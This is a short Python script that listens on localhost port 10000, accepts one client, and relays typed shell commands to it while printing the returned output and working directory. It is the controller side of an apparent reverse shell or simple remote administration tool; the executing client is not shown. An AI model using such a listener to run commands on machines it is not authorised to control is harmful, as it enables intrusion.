import socket

def main():
    # Create a TCP/IP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Bind the socket to the address and port
    server_address = ('localhost', 10000)
    print(f'starting up on {server_address}')
    sock.bind(server_address)

    # Listen for incoming connections
    sock.listen(1)

    # Wait for a connection
    print('waiting for a connection')
    client_sock, client_address = sock.accept()
    print(f'connection from {client_address}')

    # Get clients working directory
    wd = client_sock.recv(1024 * 128).decode()
    print(f'Clients working directory: {wd}')

    # send commands
    send_commands(client_sock, wd)
    
def send_commands(connection, cwd):
    while True:
        # Send data
        message = input(f"{cwd} $> ")
        if message.strip() == "":
            continue

        connection.sendall(message.encode())
        if message == "exit":
            break;

        output = connection.recv(1024 * 128).decode()
        message = output.split('|')
        cwd = message[1]
        print(output)

# Clean up the connection

if __name__ == "__main__":
    main()